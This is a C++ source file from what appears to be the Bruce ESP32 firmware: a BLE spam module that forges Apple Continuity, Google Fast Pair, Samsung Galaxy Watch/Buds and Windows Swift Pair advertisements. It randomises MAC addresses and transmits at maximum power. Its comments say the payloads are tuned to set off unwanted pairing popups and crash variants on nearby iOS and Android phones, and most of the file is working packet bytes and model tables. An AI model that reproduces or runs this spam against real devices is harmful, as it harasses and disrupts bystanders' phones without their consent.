/**
 * ble_spam.cpp — BLE Spam Module for Bruce Firmware
 *
 * Original BLE spam implementation by Bruce/EA7KDO.
 *
 * Major improvements by Doominator1 (https://github.com/Doominator1):
 *   - Unified spam UI with per-device selection, configurable adv/gap timing,
 *     TX power control, MAC randomisation frequency selector, and live pkt/s stats
 *   - Eliminated BLE stack deinit/init on MAC rotation — fixes crashes at tight intervals
 *   - xorshift64* PRNG for fast MAC generation without hardware RNG overhead
 *   - Watchdog reset in run loop for stability at tight intervals
 *   - BLE Beacon spam, Swift Pair presets + persistent custom name lists
 *   - Random/All added to Apple Pairing, Apple Action, Android, Samsung, Windows menus
 *   - Config persistence across reboots via Preferences
 *
 * Packet improvements merged from MarlinSchuck (https://github.com/MarlinSchuck):
 *   - Apple Continuity dynamic random fields matching Flipper Zero reference —
 *     triggers iOS popups where static payloads failed (ProximityPair, NearbyAction,
 *     CustomCrash variants)
 *   - Samsung EasySetup Galaxy Buds packet (previously only Watch was present)
 *   - Expanded Google FastPair model list (75+ models)
 *
 * Additional improvements by Ninja-jr (https://github.com/Ninja-jr):
 *   - Samsung device detection by MAC OUI for automatic FastPair selection
 *   - Smart Android spam: uses Samsung FastPair on Samsung devices, Google FastPair on others
 *   - Enhanced Apple Spam with iCloud binding spoofing (separate PR)
 *   - MAC randomization every packet for Apple Spam (same strategy as Samsung)
 *   - Single BLE stack initialization in Apple Spam (no deinit/init per packet)
 */

#include "ble_spam.h"
#include "ble_p4_compat.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#include "core/radio_mem.h"
#include "core/sd_functions.h"
#include "core/utils.h"
#ifdef CONFIG_BT_NIMBLE_ENABLED
#include "esp_mac.h"
#if __has_include("host/ble_hs.h")
#include "host/ble_hs.h"
#define HAS_BLE_HS_H 1
#endif
#elif defined(CONFIG_BT_BLUEDROID_ENABLED)
#include "esp_gap_ble_api.h"
#endif
#include "esp_task_wdt.h"
#include <globals.h>
#if __has_include(<Preferences.h>)
#include <Preferences.h>
#define BLE_SPAM_HAS_PREFERENCES 1
#endif
#if defined(CONFIG_IDF_TARGET_ESP32C3) || defined(CONFIG_IDF_TARGET_ESP32C2) ||                              \
    defined(CONFIG_IDF_TARGET_ESP32S3)
#define MAX_TX_POWER ESP_PWR_LVL_P21
#elif defined(CONFIG_IDF_TARGET_ESP32H2) || defined(CONFIG_IDF_TARGET_ESP32C6) ||                            \
    defined(CONFIG_IDF_TARGET_ESP32C5)
#define MAX_TX_POWER ESP_PWR_LVL_P20
#else
#define MAX_TX_POWER ESP_PWR_LVL_P9
#endif

// ============================================================================
// Samsung Device Detection (Ninja-jr)
// ============================================================================
// Samsung MAC OUIs (first 3 bytes of MAC address)
// Used to automatically select the correct FastPair type:
// - Samsung FastPair for Samsung devices
// - Google FastPair for all other Android devices
// ============================================================================

static const char *SAMSUNG_MAC_OUIS[] = {
    "00:02:78", "00:21:19", "00:26:37", "20:64:32", "38:AA:3C", "50:CC:F8",
    "5C:0A:5B", "5C:A3:9D", "78:D6:F0", "84:0B:2D", "90:18:7C", "98:0C:82",
    "A0:0B:BA", "A8:CA:B9", "B4:07:F9", "CC:3A:61", "DC:71:44", "FC:1F:19",
    "04:D6:AA", "08:C5:E1", "14:49:E0", "24:18:1D", "28:C2:1F", "2C:0E:3D",
    "30:07:4D", "30:AB:6A", "34:23:BA", "40:0E:85", "40:E9:9B", "4C:66:41",
    "54:88:0E", "6C:C7:EC", "84:38:38", "88:32:9B", "8C:B8:4A", "8C:F5:A3",
    "A8:DB:03", "AC:5F:3E", "B4:79:A7", "BC:8C:CD", "C0:97:27", "C0:BD:D1",
    "C8:BA:94", "D0:22:BE", "D0:25:44", "E8:50:8B", "EC:1F:72", "EC:9B:F3",
    "F0:25:B7", "F4:02:28", "F4:09:D8", "F8:04:2E",
    "00:00:F0", "00:07:AB", "00:12:47", "00:12:FB", "00:13:77", "00:15:99",
    "00:15:B9", "00:16:32", "00:16:6B", "00:16:6C", "00:16:DB", "00:17:C9",
    "00:17:D5", "00:18:AF", "00:1A:8A", "00:1B:98", "00:1C:43", "00:1D:25",
    "00:1D:F6", "00:1E:7D", "00:1E:E1", "00:1E:E2", "00:1F:CC", "00:1F:CD",
    "00:21:4C", "00:21:D1", "00:21:D2", "00:23:39", "00:23:3A", "00:23:99",
    "00:23:C2", "00:23:D6", "00:23:D7", "00:24:54", "00:24:90", "00:24:91",
    "00:24:E9", "00:25:66", "00:25:67", "00:26:5D", "00:26:5F", "00:6F:64",
    "00:73:E0", "00:7C:2D", "00:87:01", "00:B5:D0", "00:BF:61", "00:C3:F4",
    "00:E0:64", "00:E3:B2", "00:F4:6F", "00:FA:21",
    "04:18:0F", "04:1B:BA", "04:29:2E", "04:B1:A1", "04:B4:29", "04:B9:E3",
    "04:BA:8D", "04:BD:BF", "04:FE:31",
    "08:08:C2", "08:21:EF", "08:37:3D", "08:3D:88", "08:78:08", "08:8C:2C",
    "08:AE:D6", "08:BF:A0", "08:D4:2B", "08:EC:A9", "08:EE:8B", "08:FC:88",
    "08:FD:0E",
    "0C:02:BD", "0C:14:20", "0C:2F:B0", "0C:71:5D", "0C:89:10", "0C:8D:CA",
    "0C:A8:A7", "0C:B3:19", "0C:DF:A4", "0C:E0:DC",
    "10:07:B6", "10:1D:C0", "10:29:AB", "10:2B:41", "10:30:47", "10:39:17",
    "10:3B:59", "10:77:B1", "10:89:FB", "10:8E:E0", "10:92:66", "10:D3:8A",
    "10:D5:42", "10:E4:C2", "10:EC:81",
    "14:01:52", "14:1F:78", "14:32:D1", "14:56:8E", "14:89:FD", "14:96:E5",
    "14:9F:3C", "14:A3:64", "14:B4:84", "14:BB:6E", "14:F4:2A",
    "18:16:C9", "18:19:D6", "18:1E:B0", "18:21:95", "18:22:7E", "18:26:54",
    "18:26:66", "18:3A:2D", "18:3F:47", "18:46:17", "18:4E:16", "18:4E:CB",
    "18:54:CF", "18:5B:B3", "18:67:B0", "18:69:D4", "18:83:31", "18:89:5B",
    "18:AB:1D", "18:CE:94", "18:E2:C2",
    "1C:23:2C", "1C:3A:DE", "1C:5A:3E", "1C:62:B8", "1C:66:AA", "1C:76:F2",
    "1C:86:9A", "1C:AF:05", "1C:AF:4A", "1C:E5:7F", "1C:E6:1D", "1C:F8:D0",
    "20:13:E0", "20:2D:07", "20:32:6C", "20:55:31", "20:5E:F7", "20:6E:9C",
    "20:D3:90", "20:D5:BF", "20:DB:AB",
    "24:09:35", "24:11:53", "24:4B:03", "24:4B:81", "24:5A:B5", "24:68:B0",
    "24:92:0E", "24:C6:13", "24:C6:96", "24:DB:ED", "24:F0:D3", "24:F5:AA",
    "24:FC:E5",
    "28:02:D8", "28:27:BF", "28:39:5E", "28:3D:C2", "28:83:35", "28:98:7B",
    "28:BA:B5", "28:CC:01",
    "2C:15:BF", "2C:40:53", "2C:44:01", "2C:99:75", "2C:AE:2B", "2C:BA:BA",
    "30:19:66", "30:6A:85", "30:74:67", "30:96:FB", "30:C7:AE", "30:CB:F8",
    "30:CD:A7", "30:D5:87", "30:D6:C9",
    "34:14:5F", "34:2D:0D", "34:31:11", "34:82:C5", "34:8A:7B", "34:AA:8B",
    "34:BE:00", "34:C3:AC", "34:F0:43",
    "38:01:95", "38:0A:94", "38:0B:40", "38:16:D1", "38:2D:D1", "38:2D:E8",
    "38:68:A4", "38:6A:77", "38:8A:06", "38:8F:30", "38:94:96", "38:9A:F6",
    "38:D4:0B", "38:EC:E4",
    "3C:05:18", "3C:19:5E", "3C:20:F6", "3C:57:6C", "3C:5A:37", "3C:62:00",
    "3C:8B:FE", "3C:A1:0D", "3C:BB:FD", "3C:DC:BC", "3C:F7:A4",
    "40:11:C3", "40:16:3B", "40:35:E6", "40:5E:F6", "40:D3:AE",
    "44:16:FA", "44:4E:1A", "44:5C:E9", "44:6D:6C", "44:78:3E", "44:EA:30",
    "44:F4:59",
    "48:13:7E", "48:27:EA", "48:44:F7", "48:49:C7", "48:51:69", "48:61:EE",
    "48:79:4D", "48:9D:D1", "48:BC:E1", "48:C7:96",
    "4C:2E:5E", "4C:3C:16", "4C:66:A6", "4C:A5:6D", "4C:BC:A5", "4C:C9:5E",
    "4C:DD:31",
    "50:01:BB", "50:32:75", "50:3D:A1", "50:49:B0", "50:50:A4", "50:56:BF",
    "50:77:05", "50:85:69", "50:92:B9", "50:9E:A7", "50:A4:C8", "50:B7:C3",
    "50:C8:E5", "50:F0:D3", "50:F5:20", "50:FC:9F",
    "54:21:9D", "54:3A:D6", "54:40:AD", "54:44:A3", "54:92:BE", "54:9B:12",
    "54:B8:02", "54:BD:79", "54:D1:7D", "54:F2:01", "54:FA:3E", "54:FC:F0",
    "58:20:71", "58:A6:39", "58:B1:0F", "58:C3:8B", "58:C5:CB",
    "5C:10:C5", "5C:2E:59", "5C:3C:27", "5C:49:7D", "5C:51:81", "5C:86:5C",
    "5C:99:60", "5C:AC:3D", "5C:C1:D7", "5C:CB:99", "5C:E8:EB", "5C:ED:F4",
    "5C:F6:DC",
    "60:3A:AF", "60:68:4E", "60:6B:BD", "60:77:E2", "60:8E:08", "60:8F:5C",
    "60:A1:0A", "60:A4:D0", "60:AF:6D", "60:C5:AD", "60:D0:A9", "60:FF:12",
    "64:03:7F", "64:07:F6", "64:17:CD", "64:1B:2F", "64:1C:AE", "64:1C:B0",
    "64:5D:F4", "64:6C:B2", "64:77:91", "64:7B:CE", "64:89:F1", "64:B3:10",
    "64:B5:F2", "64:B8:53", "64:D0:D6", "64:E7:D8",
    "68:05:71", "68:27:37", "68:48:98", "68:4A:E9", "68:5A:CF", "68:72:C3",
    "68:7D:6B", "68:BF:C4", "68:E7:C2", "68:EB:AE", "68:FC:CA",
    "6C:00:6B", "6C:2F:2C", "6C:2F:8A", "6C:55:63", "6C:70:CB", "6C:83:36",
    "6C:AC:C2", "6C:B7:F4", "6C:DD:BC", "6C:F3:73",
    "70:09:71", "70:1F:3C", "70:28:8B", "70:2A:D5", "70:5A:AC", "70:B1:3D",
    "70:CE:8C", "70:F9:27", "70:FD:46",
    "74:19:0A", "74:45:8A", "74:9E:F5", "74:EB:80",
    "78:00:9E", "78:1F:DB", "78:23:27", "78:25:AD", "78:37:16", "78:40:E4",
    "78:46:D4", "78:47:1D", "78:52:1A", "78:59:5E", "78:9E:D0", "78:A8:73",
    "78:AB:BB", "78:BD:BC", "78:C3:E9", "78:F2:38", "78:F7:BE",
    "7C:0A:3F", "7C:0B:C6", "7C:1C:68", "7C:23:02", "7C:2E:DD", "7C:38:AD",
    "7C:64:56", "7C:78:7E", "7C:89:56", "7C:8B:B5", "7C:91:22", "7C:C2:25",
    "7C:F8:54", "7C:F9:0E",
    "80:07:94", "80:18:A7", "80:19:70", "80:20:FD", "80:31:F0", "80:39:8C",
    "80:47:86", "80:4E:70", "80:4E:81", "80:54:9C", "80:57:19", "80:65:6D",
    "80:7B:3E", "80:86:D9", "80:8A:BD", "80:9F:F5", "80:CE:B9",
    "84:11:9E", "84:22:89", "84:25:19", "84:25:DB", "84:2E:27", "84:37:D5",
    "84:51:81", "84:55:A5", "84:5F:04", "84:98:66", "84:A4:66", "84:B5:41",
    "84:C0:EF",
    "88:29:9C", "88:75:98", "88:83:22", "88:9B:39", "88:9F:6F", "88:A3:03",
    "88:AD:D2", "88:BD:45",
    "8C:1A:BF", "8C:6A:3B", "8C:71:F8", "8C:77:12", "8C:79:F5", "8C:83:E1",
    "8C:B0:E9", "8C:BF:A6", "8C:C8:CD", "8C:DE:E6", "8C:E5:C0", "8C:EA:48",
    "90:00:DB", "90:06:28", "90:63:3B", "90:81:75", "90:97:F3", "90:B1:44",
    "90:B6:22", "90:EE:C7", "90:F1:AA",
    "94:01:C2", "94:2D:DC", "94:35:0A", "94:51:03", "94:52:44", "94:63:D1",
    "94:76:B7", "94:7B:E7", "94:8B:C1", "94:B1:0A", "94:D7:71", "94:E1:29",
    "98:06:3C", "98:0D:6F", "98:1D:FA", "98:2D:68", "98:39:8E", "98:52:B1",
    "98:80:EE", "98:83:89", "98:B0:8B", "98:B8:BC", "98:D7:42",
    "9C:02:98", "9C:25:95", "9C:2A:83", "9C:2E:7A", "9C:3A:AF", "9C:5F:B0",
    "9C:65:B0", "9C:73:B1", "9C:8C:6E", "9C:A5:13", "9C:D3:5B", "9C:E0:63",
    "9C:E6:E7",
    "A0:07:98", "A0:10:81", "A0:21:95", "A0:27:B6", "A0:60:90", "A0:75:91",
    "A0:82:1F", "A0:AC:69", "A0:B4:A5", "A0:CB:FD", "A0:D0:5B", "A0:D7:22",
    "A0:D7:F3",
    "A4:07:B6", "A4:30:7A", "A4:6C:F1", "A4:75:B9", "A4:84:31", "A4:9A:58",
    "A4:9D:DD", "A4:C6:9A", "A4:D9:90", "A4:EB:D3",
    "A8:06:00", "A8:16:D0", "A8:2B:B9", "A8:30:BC", "A8:34:6A", "A8:4B:4D",
    "A8:51:5B", "A8:76:50", "A8:79:8D", "A8:7C:01", "A8:81:95", "A8:87:B3",
    "A8:9F:BA", "A8:F2:74",
    "AC:1E:92", "AC:36:13", "AC:5A:14", "AC:6C:90", "AC:80:FB", "AC:AF:B9",
    "AC:C3:3A", "AC:EE:9E",
    "B0:47:BF", "B0:4A:6A", "B0:6F:E0", "B0:99:D7", "B0:C4:E7", "B0:C5:59",
    "B0:D0:9C", "B0:DF:3A", "B0:E4:5C", "B0:EC:71",
    "B4:0B:1D", "B4:1A:1D", "B4:3A:28", "B4:40:DC", "B4:62:93", "B4:70:64",
    "B4:74:43", "B4:9D:02", "B4:BF:F6", "B4:CE:40", "B4:EF:39",
    "B8:57:D8", "B8:5A:73", "B8:5E:7B", "B8:6C:E8", "B8:B4:09", "B8:BB:AF",
    "B8:BC:5B", "B8:C6:8E", "B8:D9:CE",
    "BC:10:7B", "BC:14:85", "BC:20:A4", "BC:32:B2", "BC:44:86", "BC:45:5B",
    "BC:47:60", "BC:52:74", "BC:54:51", "BC:72:B1", "BC:76:5E", "BC:79:AD",
    "BC:7A:BF", "BC:7E:8B", "BC:85:1F", "BC:93:07", "BC:A5:8B", "BC:B1:F3",
    "BC:D1:1F", "BC:E6:3F", "BC:F7:30",
    "C0:11:73", "C0:17:4D", "C0:23:8D", "C0:3D:03", "C0:48:E6", "C0:65:99",
    "C0:87:EB", "C0:89:97", "C0:BD:C8", "C0:D2:DD", "C0:D3:C0", "C0:DC:DA",
    "C4:18:E9", "C4:1C:07", "C4:42:02", "C4:50:06", "C4:57:6E", "C4:5D:83",
    "C4:62:EA", "C4:73:1E", "C4:7D:9F", "C4:88:E5", "C4:93:D9", "C4:AE:12",
    "C8:12:0B", "C8:14:79", "C8:19:F7", "C8:38:70", "C8:41:8A", "C8:51:42",
    "C8:7E:75", "C8:90:8A", "C8:A6:EF", "C8:A8:23", "C8:BD:4D", "C8:BD:69",
    "C8:D7:B0",
    "CC:05:1B", "CC:07:AB", "CC:21:19", "CC:46:4E", "CC:6E:A4", "CC:B1:1A",
    "CC:E6:86", "CC:F8:26", "CC:F9:E8", "CC:FE:3C",
    "D0:03:DF", "D0:04:B0", "D0:17:6A", "D0:1B:49", "D0:31:69", "D0:39:FA",
    "D0:59:E4", "D0:66:7B", "D0:7F:A0", "D0:87:E2", "D0:B1:28", "D0:C1:B1",
    "D0:C2:4E", "D0:D0:03", "D0:DF:C7", "D0:FC:CC",
    "D4:11:A3", "D4:7A:E2", "D4:87:D8", "D4:88:90", "D4:8A:39", "D4:9D:C0",
    "D4:AE:05", "D4:E6:B7", "D4:E8:B2",
    "D8:08:31", "D8:0B:9A", "D8:31:CF", "D8:55:75", "D8:57:EF", "D8:5B:2A",
    "D8:68:A0", "D8:68:C3", "D8:90:E8", "D8:A3:5C", "D8:C4:E9", "D8:E0:E1",
    "DC:44:B6", "DC:66:72", "DC:69:E2", "DC:74:A8", "DC:89:83", "DC:CC:E6",
    "DC:CF:96", "DC:DC:E2", "DC:F7:56",
    "E0:03:6B", "E0:99:71", "E0:9D:13", "E0:AA:96", "E0:C3:77", "E0:CB:EE",
    "E0:D0:83", "E0:DB:10",
    "E4:12:1D", "E4:32:CB", "E4:40:E2", "E4:58:B8", "E4:58:E7", "E4:5D:75",
    "E4:7C:F9", "E4:7D:BD", "E4:92:FB", "E4:B0:21", "E4:E0:C5", "E4:EC:E8",
    "E4:F3:C4", "E4:F8:EF", "E4:FA:ED",
    "E8:03:9A", "E8:11:32", "E8:3A:12", "E8:4E:84", "E8:6D:CB", "E8:7F:6B",
    "E8:93:09", "E8:AA:CB", "E8:B4:C8", "E8:E5:D6",
    "EC:10:7B", "EC:7C:B6", "EC:AA:25", "EC:E0:9B",
    "F0:08:F1", "F0:39:65", "F0:5A:09", "F0:5B:7B", "F0:65:AE", "F0:6B:CA",
    "F0:70:4F", "F0:72:8C", "F0:8A:76", "F0:CD:31", "F0:E7:7E", "F0:EE:10",
    "F0:F5:64",
    "F4:0E:22", "F4:2B:8C", "F4:42:8F", "F4:71:90", "F4:7B:5E", "F4:7D:EF",
    "F4:9F:54", "F4:C2:48", "F4:D9:FB", "F4:F3:09", "F4:FE:FB",
    "F8:3F:51", "F8:4E:58", "F8:5B:6E", "F8:77:B8", "F8:84:F2", "F8:8F:07",
    "F8:D0:BD", "F8:E6:1A", "F8:F1:E6",
    "FC:03:9F", "FC:19:10", "FC:42:03", "FC:64:3A", "FC:8F:90", "FC:A1:3E",
    "FC:A6:21", "FC:AA:B6", "FC:C7:34", "FC:DE:90", "FC:F1:36",
    "00:72:04", "08:15:2F", "44:8F:17",
    "00:25:38", "18:BF:B3",
    "FA:63:E1",
    "00:0D:AE",
    "74:5F:00",
    "00:09:18",
    "00:0D:E5",
    "FC:00:12"
};

static int SAMSUNG_MAC_OUIS_COUNT = sizeof(SAMSUNG_MAC_OUIS) / sizeof(SAMSUNG_MAC_OUIS[0]);

static bool isSamsungDevice(const String &mac) {
    for (int i = 0; i < SAMSUNG_MAC_OUIS_COUNT; i++) {
        if (mac.startsWith(SAMSUNG_MAC_OUIS[i])) return true;
    }
    return false;
}

struct WatchModel {
    uint8_t value;
};
struct DeviceType {
    uint32_t value;
};

enum EBLEPayloadType { Microsoft, Samsung, Google };

// Apple Continuity — Nearby Action type codes
static const uint8_t continuity_na_actions[] = {
    0x13,
    0x24,
    0x05,
    0x27,
    0x20,
    0x19,
    0x1E,
    0x09,
    0x2F,
    0x02,
    0x0B,
    0x01,
    0x06,
    0x0D,
    0x2B,
};
static const int continuity_na_actions_count =
    sizeof(continuity_na_actions) / sizeof(continuity_na_actions[0]);

// ============================================================================
// Google Fast Pair — 3-byte model codes
// Expanded list (Doominator1 original + MarlinSchuck additions, deduped)
// Each triggers "New device nearby" Fast Pair popup on Android
// ============================================================================
const DeviceType android_models[] = {
    {0x0001F0}, {0x000047}, {0x470000}, {0x00000A}, {0x0A0000}, {0x00000B}, {0x0B0000}, {0x00000D},
    {0x000007}, {0x070000}, {0x000009}, {0x090000}, {0x000048}, {0x001000}, {0x00B727}, {0x01E5CE},
    {0x0200F0}, {0x00F7D4}, {0xF00002}, {0xF00400}, {0x1E89A7}, {0x0577B1}, {0x05A9BC}, {0xCD8256},
    {0x0000F0}, {0xF00000}, {0x821F66}, {0xF52494}, {0x718FA4}, {0x0002F0}, {0x92BBBD}, {0x000006},
    {0x060000}, {0xD446A7}, {0x2D7A23}, {0x038B91}, {0x02F637}, {0x02D886}, {0xF00001}, {0xF00201},
    {0xF00209}, {0xF00205}, {0xF00305}, {0xF00E97}, {0x04ACFC}, {0x04AA91}, {0x04AFB8}, {0x05A963},
    {0x05AA91}, {0x05C452}, {0x05C95C}, {0x0602F0}, {0x0603F0}, {0x1E8B18}, {0x1E955B}, {0x06AE20},
    {0x06C197}, {0x06C95C}, {0x06D8FC}, {0x0744B6}, {0x07A41C}, {0x07C95C}, {0x07F426}, {0x0102F0},
    {0x054B2D}, {0x0660D7}, {0x0103F0}, {0x0903F0}, {0x9ADB11}, {0x8B66AB}, {0xD99CA1}, {0x77FF67},
    {0xAA187F}, {0xDCE9EA}, {0x87B25F}, {0x1448C9}, {0x13B39D}, {0x7C6CDB}, {0x005EF9}, {0xE2106F},
    {0xB37A62}, {0x92ADC9}
};
int android_models_count = sizeof(android_models) / sizeof(android_models[0]);

// ============================================================================
// Samsung EasySetup — Galaxy Watch + Galaxy Buds models
// ============================================================================

// Galaxy Watch — single byte model selector, ported from the current Flipper
// Zero ble_spam app's samsung_watches table.
// Triggers "Galaxy Watch detected" pairing popup on Samsung Android devices
const WatchModel watch_models[] = {
    {0x1A}, {0x01}, {0x02}, {0x03}, {0x04}, {0x05}, {0x06}, {0x07}, {0x08}, {0x09}, {0x0A}, {0x0B},
    {0x0C}, {0x11}, {0x12}, {0x13}, {0x14}, {0x15}, {0x16}, {0x17}, {0x18}, {0x1B}, {0x1C}, {0x1D},
    {0x1E}, {0x20}, {0x21}, {0x22}, {0x23}, {0x24}, {0x25}, {0x26}, {0x27}, {0x28}, {0x29}, {0x2A},
    {0x30}, {0x31}, {0x32}, {0x33}, {0x34}, {0x35}, {0x40}, {0x41}, {0x42}, {0x60}, {0x61}, {0x62},
};
static const int watch_models_count = sizeof(watch_models) / sizeof(watch_models[0]);

// Galaxy Buds — 3-byte RGB color codes, ported from the current Flipper Zero
// ble_spam app's samsung_buds table.
// Triggers "Galaxy Buds detected" pairing popup on Samsung Android devices
static const uint32_t samsung_buds_models[] = {
    0xEE7A0C, 0x9D1700, 0x39EA48, 0xA7C62C, 0x850116, 0x3D8F41, 0x3B6D02, 0xAE063C, 0xB8B905, 0xEAAA17,
    0xD30704, 0x9DB006, 0x101F1A, 0x859608, 0x8E4503, 0x2C6740, 0x3F6718, 0x42C519, 0xAE073A, 0x011716,
    0x123456, 0x654321, 0x789ABC, 0xDEF123, 0x456789, 0xABC123, 0x321654, 0x987654, 0x654987, 0x321987,
};
static const int samsung_buds_count = sizeof(samsung_buds_models) / sizeof(samsung_buds_models[0]);

char randomNameBuffer[32];

const char *generateRandomName() {
    const char *charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
    int len = rand() % 10 + 1;
    if (len > 31) len = 31;
    for (int i = 0; i < len; ++i) { randomNameBuffer[i] = charset[rand() % strlen(charset)]; }
    randomNameBuffer[len] = '\0';
    return randomNameBuffer;
}

void generateRandomMac(uint8_t *mac) {
    esp_fill_random(mac, 6);
    mac[0] = (mac[0] & 0xFE) | 0x02;
}

BLEAdvertising *pAdvertising;

BLEAdvertisementData GetUniversalAdvertisementData(EBLEPayloadType Type, const String &customName = "") {
    BLEAdvertisementData AdvData = BLEAdvertisementData();
    uint8_t *AdvData_Raw = nullptr;
    uint8_t i = 0;

    switch (Type) {
        case Microsoft: {
            const char *Name;
            uint8_t name_len;

            if (customName.length() > 0) {
                Name = customName.c_str();
                name_len = customName.length();
            } else {
                Name = generateRandomName();
                name_len = strlen(Name);
            }
            // The manufacturer-data element built below is 7+name_len bytes, and the
            // caller always adds a 3-byte Flags element on top (see setFlags() calls
            // after GetUniversalAdvertisementData() for Microsoft). Clamp so the two
            // together never exceed the 31-byte legacy adv payload limit.
            if (name_len > 21) name_len = 21;

            uint8_t AdvData_Raw_Local[7 + 31];
            AdvData_Raw = AdvData_Raw_Local;
            AdvData_Raw[i++] = 6 + name_len;
            AdvData_Raw[i++] = 0xFF;
            AdvData_Raw[i++] = 0x06;
            AdvData_Raw[i++] = 0x00;
            AdvData_Raw[i++] = 0x03;
            AdvData_Raw[i++] = 0x00;
            AdvData_Raw[i++] = 0x80;
            memcpy(&AdvData_Raw[i], Name, name_len);
            i += name_len;
            AdvData.addData(AdvData_Raw, 7 + name_len);
            break;
        }
        case Samsung: {
            BLEAdvertisementData AdvData = BLEAdvertisementData();
            if (random(2) == 0) {
                // Galaxy Watch packet
                uint8_t model = watch_models[random(watch_models_count)].value;
                uint8_t Samsung_Data[15] = {
                    0x0E,
                    0xFF,
                    0x75,
                    0x00,
                    0x01,
                    0x00,
                    0x02,
                    0x00,
                    0x01,
                    0x01,
                    0xFF,
                    0x00,
                    0x00,
                    0x43,
                    (uint8_t)((model >> 0x00) & 0xFF)
                };
                AdvData.addData(Samsung_Data, 15);
                AdvData.setFlags(0x06);
            } else {
                // Galaxy Buds packet (MarlinSchuck)
                uint32_t model = samsung_buds_models[random(samsung_buds_count)];
                uint8_t Buds_Data[31];
                uint8_t bi = 0;
                Buds_Data[bi++] = 27;
                Buds_Data[bi++] = 0xFF;
                Buds_Data[bi++] = 0x75;
                Buds_Data[bi++] = 0x00;
                Buds_Data[bi++] = 0x42;
                Buds_Data[bi++] = 0x09;
                Buds_Data[bi++] = 0x81;
                Buds_Data[bi++] = 0x02;
                Buds_Data[bi++] = 0x14;
                Buds_Data[bi++] = 0x15;
                Buds_Data[bi++] = 0x03;
                Buds_Data[bi++] = 0x21;
                Buds_Data[bi++] = 0x01;
                Buds_Data[bi++] = 0x09;
                Buds_Data[bi++] = (model >> 16) & 0xFF;
                Buds_Data[bi++] = (model >> 8) & 0xFF;
                Buds_Data[bi++] = 0x01;
                Buds_Data[bi++] = model & 0xFF;
                Buds_Data[bi++] = 0x06;
                Buds_Data[bi++] = 0x3C;
                Buds_Data[bi++] = 0x94;
                Buds_Data[bi++] = 0x8E;
                Buds_Data[bi++] = 0x00;
                Buds_Data[bi++] = 0x00;
                Buds_Data[bi++] = 0x00;
                Buds_Data[bi++] = 0x00;
                Buds_Data[bi++] = 0xC7;
                Buds_Data[bi++] = 0x00;
                // Trailing truncated record (length=0x10 claimed, only 2 data
                // bytes present) — ported from the Flipper Zero ble_spam app.
                // Real Galaxy Buds advertise this stub second record; without
                // it Samsung's scanner doesn't recognize the packet.
                Buds_Data[bi++] = 0x10;
                Buds_Data[bi++] = 0xFF;
                Buds_Data[bi++] = 0x75;
                AdvData.addData(Buds_Data, bi);
                // Buds_Data already fills the full 31-byte legacy adv payload;
                // there's no room left for a Flags AD element, so don't add one
                // here (setFlags would just fail with "Data length exceeded").
            }
            return AdvData;
        }
        case Google: {
            const uint32_t model = android_models[rand() % android_models_count].value;
            uint8_t Google_Data[14] = {
                0x03,
                0x03,
                0x2C,
                0xFE,
                0x06,
                0x16,
                0x2C,
                0xFE,
                (uint8_t)((model >> 0x10) & 0xFF),
                (uint8_t)((model >> 0x08) & 0xFF),
                (uint8_t)((model >> 0x00) & 0xFF),
                0x02,
                0x0A,
                (uint8_t)((rand() % 120) - 100)
            };
            AdvData.addData(Google_Data, 14);
            break;
        }
        default: {
            Serial.println("Please Provide a Company Type");
            break;
        }
    }

    return AdvData;
}

// ============================================================================
// iBeacon - FIXED: Proper button handling + stack init/deinit
// ============================================================================

void ibeacon(const char *DeviceName, const char *BEACON_UUID, int ManufacturerId) {
    // CRITICAL: Clear any pending button presses before starting
    delay(50);
    while (check(AnyKeyPress)) { vTaskDelay(10 / portTICK_PERIOD_MS); }
    // Reset all button states
    SelPress = false;
    EscPress = false;
    PrevPress = false;
    NextPress = false;
    AnyKeyPress = false;

    uint8_t macAddr[6];
    generateRandomMac(macAddr);
    esp_iface_mac_addr_set(macAddr, ESP_MAC_BT);

    // FIX: Always init - if already init'd, it's a no-op
    // This handles the case where another module deinit'd the stack
    BLEDevice::init(DeviceName);
    vTaskDelay(5 / portTICK_PERIOD_MS);
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);

    NimBLEBeacon myBeacon;
    myBeacon.setManufacturerId(0x4c00);
    myBeacon.setMajor(5);
    myBeacon.setMinor(88);
    myBeacon.setSignalPower(0xc5);
    myBeacon.setProximityUUID(BLEUUID(BEACON_UUID));

    pAdvertising = BLEDevice::getAdvertising();
    BLEAdvertisementData advertisementData = BLEAdvertisementData();
    advertisementData.setFlags(0x1A);
    advertisementData.setManufacturerData(myBeacon.getData());
    pAdvertising->setAdvertisementData(advertisementData);

    drawMainBorderWithTitle("iBeacon");
    padprintln("");
    padprintln("UUID:" + String(BEACON_UUID));
    padprintln("");
    padprintln("Press Any key to STOP.");

    // Main loop - with proper button handling
    bool running = true;
    while (running) {
        pAdvertising->start();
        Serial.println("Advertising started...");

        // Check for button press with debounce
        for (int i = 0; i < 20; i++) {
            vTaskDelay(1 / portTICK_PERIOD_MS);
            if (check(AnyKeyPress) || check(EscPress) || check(SelPress)) {
                running = false;
                break;
            }
        }

        pAdvertising->stop();
        vTaskDelay(5 / portTICK_PERIOD_MS);
        Serial.println("Advertising stop");
    }

    // Deinit the BLE stack - self-contained module
    BLEDevice::deinit();
    Serial.println("[iBeacon] BLE stack deinitialized");
}

// ============================================================================
// BLE Spam Attack Types and Configuration
// ============================================================================

enum BleSpamAttackType {
    BLE_SPAM_ATTACK_APPLE_PAIRING,
    BLE_SPAM_ATTACK_APPLE_ACTION,
    BLE_SPAM_ATTACK_APPLE_NOT_YOUR_DEVICE,
    BLE_SPAM_ATTACK_ANDROID_ALERT,
    BLE_SPAM_ATTACK_WINDOWS_SWIFT_PAIR,
    BLE_SPAM_ATTACK_SAMSUNG,
    BLE_SPAM_ATTACK_BLE_BEACON,
    BLE_SPAM_ATTACK_RANDOM_ALL
};

#define BLE_SPAM_MAX_CUSTOM_NAMES 20

static std::vector<String> bleSpamLoadCustomNames(const char *ns) {
    std::vector<String> names;
#if defined(BLE_SPAM_HAS_PREFERENCES)
    Preferences prefs;
    if (prefs.begin(ns, true)) {
        uint8_t count = prefs.getUChar("count", 0);
        for (uint8_t i = 0; i < count && i < BLE_SPAM_MAX_CUSTOM_NAMES; i++) {
            char key[8];
            snprintf(key, sizeof(key), "n%d", i);
            String val = prefs.getString(key, "");
            if (val.length() > 0) names.push_back(val);
        }
        prefs.end();
    }
#endif
    return names;
}

